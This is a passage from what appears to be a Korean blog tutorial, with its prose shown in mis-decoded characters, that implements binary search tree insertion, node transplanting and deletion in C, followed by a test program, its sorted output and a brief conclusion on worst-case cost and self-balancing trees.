ìƒˆë¡œìš´ ë…¸ë“œë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ì´í›„ 6í–‰ì—ì„œ ë£¨íŠ¸ ë…¸ë“œì—ì„œ ì‹œì‘í•˜ëŠ” í¬ì¸í„° <code>x</code> ì™€, <code>x</code> ì˜ ë¶€ëª¨ë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„° <code>y</code> ë¥¼ ì´ìš©í•˜ì—¬ ì´ì§„ íƒìƒ‰ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤. ë°˜ë³µë¬¸ì˜ ì¢…ë£Œ ì¡°ê±´ì€ <code>y</code> ì˜ ìì‹ <code>x</code> ê°€ <code>NULL</code> ì´ ë˜ëŠ” ê²ƒìœ¼ë¡œ, ì´ë•Œì˜ <code>x</code> ì˜ ìœ„ì¹˜ê°€ ìƒˆë¡œìš´ ë…¸ë“œë¥¼ ì‚½ì…í•´ì•¼ í•  ìœ„ì¹˜ì…ë‹ˆë‹¤. 12í–‰ì—ì„œëŠ” ì£¼ì–´ì§„ í‚¤ ê°’ê³¼ <code>y</code> ì˜ í‚¤ ê°’ì„ ë¹„êµí•˜ì—¬, ì™¼ìª½ ìì‹ìœ¼ë¡œ ì‚½ì…í• ì§€ ì˜¤ë¥¸ìª½ ìì‹ìœ¼ë¡œ ì‚½ì…í• ì§€ ê²°ì •í•©ë‹ˆë‹¤. ë§Œì•½ ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ê°€ ë¹„ì–´ ìˆì—ˆë‹¤ë©´ ìƒˆë¡œìš´ ë…¸ë“œë¥¼ ë£¨íŠ¸ ë…¸ë“œë¡œ ì„¤ì •í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(BST* bst, <span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">Node *newnode = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">Node *x = bst-&gt;root, *y = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">*newnode = (Node) &#123; key, value, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="keyword">while</span> (x != <span class="literal">NULL</span>) &#123;</span><br><span class="line">y = x;</span><br><span class="line">x = (newnode-&gt;key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line">newnode-&gt;parent = y;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (y == <span class="literal">NULL</span>) &#123;<span class="comment">// ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ê°€ ë¹„ì–´ ìˆëŠ” ê²½ìš°</span></span><br><span class="line">bst-&gt;root = newnode;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (newnode-&gt;key &lt; y-&gt;key) &#123;</span><br><span class="line">y-&gt;left = newnode;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">y-&gt;right = newnode;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="%ED%8A%B8%EB%A6%AC%EC%97%90%EC%84%9C-%EB%85%B8%EB%93%9C-%EC%82%AD%EC%A0%9C%ED%95%98%EA%B8%B0" tabindex="-1">íŠ¸ë¦¬ì—ì„œ ë…¸ë“œ ì‚­ì œí•˜ê¸°</h3><p>íŠ¸ë¦¬ì—ì„œ ë…¸ë“œë¥¼ ì‚­ì œí•˜ëŠ” ì—°ì‚°ì€ êµ¬í˜„ ì¤‘ ë‹¤ì†Œ ê¹Œë‹¤ë¡œìš´ ë¶€ë¶„ì…ë‹ˆë‹¤. í•­ìƒ ìƒˆë¡œìš´ ë…¸ë“œë¥¼ ë¦¬í”„ ë…¸ë“œë¡œ ì¶”ê°€í•˜ëŠ” ì‚½ì… ì—°ì‚°ê³¼ ë‹¬ë¦¬, ë…¸ë“œë¥¼ ì¤‘ê°„ì—ì„œ ì‚­ì œí•˜ê²Œ ë˜ë©´ íŠ¸ë¦¬ì˜ í˜•íƒœê°€ ë³€í˜•ë˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ë…¸ë“œë¥¼ ì‚­ì œí•  ë•ŒëŠ” ì‚­ì œí•  ë…¸ë“œê°€ ê°€ì§„ ìì‹ì˜ ê°œìˆ˜ì— ë”°ë¼ ê²½ìš°ê°€ ë‚˜ëˆ„ì–´ì§‘ë‹ˆë‹¤. ì•„ë˜ ê·¸ë¦¼ì€ íŠ¸ë¦¬ì—ì„œ í‚¤ <code>3</code> ì„ ê°€ì§„ ë…¸ë“œë¥¼ ì‚­ì œí•˜ëŠ” ëª¨ìŠµìœ¼ë¡œ, ì‚­ì œí•  ë…¸ë“œê°€ ìì‹ì´ ì•„ì˜ˆ ì—†ê±°ë‚˜ í•˜ë‚˜ì¸ ê²½ìš°ì…ë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/7.png" alt="7.png"></p><p>ê·¸ë¦¼ì˜ ê²½ìš°ëŠ” ë¹„êµì  ë‹¨ìˆœí•œ ê²½ìš°ë¡œ, ìì‹ì´ ì—†ëŠ” ê²½ìš°ëŠ” ë‹¨ìˆœíˆ ì‚­ì œí•˜ë©´ ë©ë‹ˆë‹¤. ìì‹ì´ í•˜ë‚˜ ìˆëŠ” ê²½ìš°ëŠ” í•´ë‹¹ ìì‹ ë…¸ë“œë¥¼ ì‚­ì œí•  ë…¸ë“œ ìœ„ì¹˜ì— ëŒ€ì…í•˜ë©´, ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì„±ì§ˆì„ ìœ ì§€í•˜ë©´ì„œ ì‚­ì œë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‚¬ì‹¤ ì´ ë‘˜ì€ êµ¬í˜„ ìƒìœ¼ë¡œëŠ” ë™ì¼í•œ ê²½ìš°ì…ë‹ˆë‹¤. ìì‹ì´ ì—†ëŠ” ê²½ìš°ë„ <code>NULL</code> ìì‹ ë…¸ë“œê°€ ìˆì–´ ì‚­ì œí•  ìœ„ì¹˜ì— <code>NULL</code> ì„ ëŒ€ì…í•œë‹¤ê³  ìƒê°í•˜ë©´ ìì‹ì´ í•˜ë‚˜ì¸ ê²½ìš°ì™€ ê°™ì€ ì½”ë“œë¡œ ì²˜ë¦¬í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.</p><p>ë°˜ë©´ ìì‹ì´ ë‘ ê°œ ìˆëŠ” ê²½ìš°ëŠ” ì¡°ê¸ˆ ë³µì¡í•©ë‹ˆë‹¤. ì´ ë•ŒëŠ” íŠ¸ë¦¬ì—ì„œ ìˆœì„œ ìƒ ë‹¤ìŒ ë…¸ë“œë¥¼ ì°¾ì€ í›„, ë‹¤ìŒ ë…¸ë“œê°€ ì‚­ì œí•  ë…¸ë“œì˜ ì˜¤ë¥¸ìª½ ìì‹ì¸ì§€ ì•„ë‹Œì§€ì— ë”°ë¼ ê²½ìš°ê°€ ë‚˜ë‰˜ê²Œ ë©ë‹ˆë‹¤. ë¨¼ì € ë‹¤ìŒ ë…¸ë“œê°€ ì˜¤ë¥¸ìª½ ìì‹ì¸ ê²½ìš°ëŠ” ë‹¤ìŒ ë…¸ë“œë¥¼ ì‚­ì œí•  ë…¸ë“œ ìœ„ì¹˜ì— ëŒ€ì…í•©ë‹ˆë‹¤. ì´ ë•Œ ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì„±ì§ˆì— ì˜í•´ ë‹¤ìŒ ë…¸ë“œëŠ” ì™¼ìª½ ìì‹ì´ ì—†ìŠµë‹ˆë‹¤. ë§Œì•½ ì™¼ìª½ ìì‹ì´ ìˆìœ¼ë©´ ê·¸ìª½ì´ ë‹¤ìŒ ë…¸ë“œê°€ ë˜ì–´ ëª¨ìˆœì´ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ë”°ë¼ì„œ ì‚­ì œí•  ë…¸ë“œ ìœ„ì¹˜ì— ëŒ€ì…í•˜ì—¬ë„, ì‚­ì œí•  ë…¸ë“œì˜ ì™¼ìª½ ìì‹ì„ ê·¸ëŒ€ë¡œ ì™¼ìª½ ìì‹ìœ¼ë¡œ ê°€ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/8.png" alt="8.png"></p><p>ë‹¤ìŒ ë…¸ë“œê°€ ì‚­ì œí•  ë…¸ë“œì˜ ì˜¤ë¥¸ìª½ ìì‹ì´ ì•„ë‹ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì´ ë•Œ ì‚­ì œí•  ë…¸ë“œë¥¼ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></eq>, ì‚­ì œí•  ë…¸ë“œì˜ ì˜¤ë¥¸ìª½ ìì‹ì„ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></eq>, ì‚­ì œí•  ë…¸ë“œì˜ ë‹¤ìŒ ë…¸ë“œë¥¼ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq> ë¼ê³  í•˜ê² ìŠµë‹ˆë‹¤. ì´ ê²½ìš°ì—ëŠ” íŠ¸ë¦¬ë¥¼ ë‘ ë²ˆ ì›€ì§ì—¬ ì£¼ì–´ì•¼ í•©ë‹ˆë‹¤. ë¨¼ì € ë‹¤ìŒ ë…¸ë“œ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>ì˜ ì˜¤ë¥¸ìª½ ìì‹ì„ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq> ìœ„ì¹˜ì— ëŒ€ì…í•©ë‹ˆë‹¤. ì´í›„ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>ë¥¼ ì‚­ì œí•  ë…¸ë“œ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></eq> ìœ„ì¹˜ì— ëŒ€ì…í•œ í›„, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></eq>ì˜ ì˜¤ë¥¸ìª½ ìì‹ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></eq>ê³¼ ì—°ê²°í•´ì¤ë‹ˆë‹¤. ì•ì„œ ë§í–ˆë“¯ ë‹¤ìŒ ë…¸ë“œ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>ëŠ” ì™¼ìª½ ìì‹ì´ ì—†ì–´, ë‘ ì‘ì—… ëª¨ë‘ ì „í˜€ ë¬¸ì œê°€ ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/9.png" alt="9.png"></p><p>ì‚­ì œ ì—°ì‚°ì€ ëª¨ë“  ê²½ìš°ì—ì„œ ë…¸ë“œë¥¼ ë‹¤ë¥¸ ë…¸ë“œì˜ ìœ„ì¹˜ì— ëŒ€ì…í•˜ëŠ” ì‘ì—…ì´ í•„ìš”í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ë¨¼ì € ëŒ€ì…ì„ ìœ„í•œ ë‚´ì¥ í•¨ìˆ˜ <code>__transplant</code> ë¥¼ êµ¬í˜„í•˜ê² ìŠµë‹ˆë‹¤. ì´ í•¨ìˆ˜ëŠ” ë…¸ë“œ <code>v</code> ë¥¼ ë…¸ë“œ <code>u</code> ìœ„ì¹˜ì— ëŒ€ì…í•œ í›„, ê¸°ì¡´ ë…¸ë“œ <code>u</code> ì˜ ë¶€ëª¨ê°€ ìƒˆë¡œìš´ ë…¸ë“œ <code>v</code> ë¥¼ ìì‹ìœ¼ë¡œ ê°–ë„ë¡ í•©ë‹ˆë‹¤. ë‹¤ë§Œ ìƒˆë¡œìš´ ë…¸ë“œ <code>v</code> ì˜ ìì‹ í¬ì¸í„°ë“¤ì„ ì—°ê²°í•˜ëŠ” ì‘ì—…ì€ í•˜ì§€ ì•Šì•„, í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œ ìª½ì—ì„œ ì§ì ‘ í•´ì•¼ í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __transplant(BST *bst, Node *u, Node *v) &#123;</span><br><span class="line"><span class="keyword">if</span> (u-&gt;parent == <span class="literal">NULL</span>) &#123;<span class="comment">// uê°€ ë£¨íŠ¸ ë…¸ë“œì¸ ê²½ìš°</span></span><br><span class="line">bst-&gt;root = v;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (u == u-&gt;parent-&gt;left) &#123;<span class="comment">// uê°€ ì™¼ìª½ ìì‹ì´ì—ˆë‹¤ë©´</span></span><br><span class="line">u-&gt;parent-&gt;left = v;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="comment">// uê°€ ì˜¤ë¥¸ìª½ ìì‹ì´ì—ˆë‹¤ë©´</span></span><br><span class="line">u-&gt;parent-&gt;right = v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (v != <span class="literal">NULL</span>) &#123;</span><br><span class="line">v-&gt;parent = u-&gt;parent;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ì œ <code>__transplant</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ ì‚­ì œ í•¨ìˆ˜ë¥¼ í¸í•˜ê²Œ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‚­ì œ ì—°ì‚°ì„ ìœ„í•œ <code>delete</code> í•¨ìˆ˜ëŠ” í‚¤ <code>key</code> ë¥¼ ë°›ì•„, ë‚´ì¥ í•¨ìˆ˜ <code>__tree_search</code> ë¥¼ í˜¸ì¶œí•˜ì—¬ ì‚­ì œí•  ë…¸ë“œ <code>x</code> ë¥¼ ì°¾ê³  ì‚­ì œí•©ë‹ˆë‹¤. 4í–‰ê³¼ 6í–‰ì€ ì‚­ì œí•  ë…¸ë“œ <code>x</code> ì˜ ìì‹ì´ ì—†ê±°ë‚˜ í•˜ë‚˜ì¸ ê²½ìš°ë¡œ, <code>__transplant</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ ìì‹ ë˜ëŠ” <code>NULL</code> ì„ <code>x</code> ìœ„ì¹˜ì— ëŒ€ì…í•©ë‹ˆë‹¤.</p><p>9í–‰ì€ <code>x</code> ì˜ ìì‹ì´ ë‘˜ì¸ ê²½ìš°ì…ë‹ˆë‹¤. ì´ ê²½ìš°ëŠ” ë¨¼ì € <code>x</code> ì˜ ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ì—ì„œ ë‹¤ìŒ ë…¸ë“œ <code>y</code> ë¥¼ ì°¾ìŠµë‹ˆë‹¤. 11í–‰ì€ <code>y</code> ê°€ <code>x</code> ì˜ ì˜¤ë¥¸ìª½ ìì‹ì´ ì•„ë‹Œ ê²½ìš°ë¡œ, ìœ„ì˜ ê·¸ë¦¼ê³¼ ê°™ì´ <code>y</code> ì˜ ì˜¤ë¥¸ìª½ ìì‹ì„ <code>y</code> ìœ„ì¹˜ì— ëŒ€ì…ì‹œì¼œ ë†“ìŠµë‹ˆë‹¤. ì´í›„ <code>y</code> ê°€ <code>x</code> ì˜ ì˜¤ë¥¸ìª½ ìì‹ (ê·¸ë¦¼ì—ì„œ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></eq>)ì˜ ë¶€ëª¨ê°€ ë˜ë„ë¡ ì—°ê²°í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë©´ 16í–‰ì—ì„œ, ë‹¤ìŒ ë…¸ë“œê°€ <code>x</code> ì˜ ì˜¤ë¥¸ìª½ ìì‹ì¸ ê²½ìš°ì™€ ë˜‘ê°™ì´ <code>y</code> ë¥¼ <code>x</code> ìœ„ì¹˜ì— ëŒ€ì…ë§Œ í•´ì£¼ë©´ ë©ë‹ˆë‹¤. ëŒ€ì… í›„ <code>y</code> ì˜ ìì‹ì— ëŒ€í•œ í¬ì¸í„° ì—°ê²°ì€ ì§ì ‘ í•´ì•¼ í•¨ì— ìœ ì˜í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">Node *x = __tree_search(bst-&gt;root, key), *y;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (x-&gt;left == <span class="literal">NULL</span>) &#123;</span><br><span class="line">__transplant(bst, x, x-&gt;right);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (x-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">__transplant(bst, x, x-&gt;left);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">y = __tree_min(x-&gt;right);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (y-&gt;parent != x) &#123;</span><br><span class="line">__transplant(bst, y, y-&gt;right);</span><br><span class="line">y-&gt;right = x-&gt;right;</span><br><span class="line">y-&gt;right-&gt;parent = y;</span><br><span class="line">&#125;</span><br><span class="line">__transplant(bst, x, y);</span><br><span class="line">y-&gt;left = x-&gt;left;</span><br><span class="line">y-&gt;left-&gt;parent = y;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8A%B8%EB%A6%AC-%EC%82%AC%EC%9A%A9%ED%95%B4%EB%B3%B4%EA%B8%B0" tabindex="-1">ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ ì‚¬ìš©í•´ë³´ê¸°</h2><p>ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ëª¨ë“  ì—°ì‚°ì„ êµ¬í˜„í–ˆìœ¼ë‹ˆ, ì§ì ‘ ì‚¬ìš©í•´ ë´…ì‹œë‹¤. ì•„ë˜ëŠ” <code>BST</code> êµ¬ì¡°ì²´ë¥¼ ì‚¬ìš©í•˜ëŠ” í…ŒìŠ¤íŠ¸ ì½”ë“œì…ë‹ˆë‹¤. 5í–‰ì€ ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì— 1ë¶€í„° 10ê¹Œì§€ì˜ í‚¤ë¥¼ ë’¤ì£½ë°•ì£½ ì‚½ì…í•˜ê³  ì¶œë ¥í•©ë‹ˆë‹¤. ì‚½ì…ì€ ê·¸ë ‡ê²Œ í•´ë„ ì¶œë ¥ì€ ì‘ì€ ìˆœì„œëŒ€ë¡œ ì˜ ë‚˜ì™€ì¤ë‹ˆë‹¤. 10í–‰ì€ í‚¤ 1~3ì„ ì‚­ì œí•˜ê³ , 11~13ì„ ìƒˆë¡œ ì§‘ì–´ë„£ì€ í›„ ë˜ ì¶œë ¥í•©ë‹ˆë‹¤. ì´ë²ˆì—ë„ 4ë¶€í„° 13ê¹Œì§€ ì‘ì€ ìˆœì„œëŒ€ë¡œ ì˜ ì¶œë ¥ë©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">8</span> &#125;;</span><br><span class="line">BST bst = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">insert(&amp;bst, arr[i], arr[i]);</span><br><span class="line">&#125;</span><br><span class="line">print(&amp;bst);</span><br><span class="line"> </span><br><span class="line">delete(&amp;bst, <span class="number">3</span>);</span><br><span class="line">delete(&amp;bst, <span class="number">2</span>);</span><br><span class="line">delete(&amp;bst, <span class="number">1</span>);</span><br><span class="line">insert(&amp;bst, <span class="number">11</span>, <span class="number">11</span>);</span><br><span class="line">insert(&amp;bst, <span class="number">12</span>, <span class="number">12</span>);</span><br><span class="line">insert(&amp;bst, <span class="number">13</span>, <span class="number">13</span>);</span><br><span class="line">print(&amp;bst);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ ./main </span><br><span class="line">1 1</span><br><span class="line">2 2</span><br><span class="line">3 3</span><br><span class="line">4 4</span><br><span class="line">5 5</span><br><span class="line">6 6</span><br><span class="line">7 7</span><br><span class="line">8 8</span><br><span class="line">9 9</span><br><span class="line">10 10</span><br><span class="line">4 4</span><br><span class="line">5 5</span><br><span class="line">6 6</span><br><span class="line">7 7</span><br><span class="line">8 8</span><br><span class="line">9 9</span><br><span class="line">10 10</span><br><span class="line">11 11</span><br><span class="line">12 12</span><br><span class="line">13 13</span><br></pre></td></tr></table></figure><h2 id="%EA%B2%B0%EB%A1%A0" tabindex="-1">ê²°ë¡ </h2><p>ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ëŠ” í‚¤-ê°’ ë°ì´í„°ë¥¼ ì •ë ¬ëœ ìˆœì„œë¡œ ê´€ë¦¬í•  ìˆ˜ ìˆê³ , ì‚½ì…ê³¼ ì‚­ì œ ë“±ì˜ ëª¨ë“  ì—°ì‚°ì„ ì´ìƒì ìœ¼ë¡œëŠ” <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>â¡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq> ì‹œê°„ì— ì²˜ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ íŠ¸ë¦¬ì˜ í˜•íƒœì— ë”°ë¼ ìµœì•…ì˜ ê²½ìš° <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq> ì‹œê°„ê¹Œì§€ ê±¸ë¦´ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê²½ìš°ì—ëŠ” ì„ í˜• ìë£Œêµ¬ì¡°ì— ë¹„í•´ ë³„ë¡œ ì¢‹ì€ ì ì´ ì—†ìŠµë‹ˆë‹¤.</p><p>ë”°ë¼ì„œ ì§‘í•©ì´ë‚˜ ë”•ì…”ë„ˆë¦¬ ë“± ì»¨í…Œì´ë„ˆì˜ êµ¬í˜„ì—ëŠ” íŠ¸ë¦¬ì˜ í˜•íƒœë¥¼ íš¨ìœ¨ì ì¸ í˜•íƒœë¡œ ìœ ì§€í•˜ë„ë¡ í•˜ëŠ” ì•Œê³ ë¦¬ì¦˜ì´ ì¶”ê°€ëœ ìê°€ ê· í˜•(self-balancing) ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì‹¤ì œë¡œ ë¦¬ëˆ…ìŠ¤ì˜ <code>g++</code> ì»´íŒŒì¼ëŸ¬ê°€ ì‚¬ìš©í•˜ëŠ” C++ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ <a href="https://stackoverflow.com/questions/2558153/what-is-the-underlying-data-structure-of-a-stl-set-in-c">ë™ì  ë¶„ì„í•œ 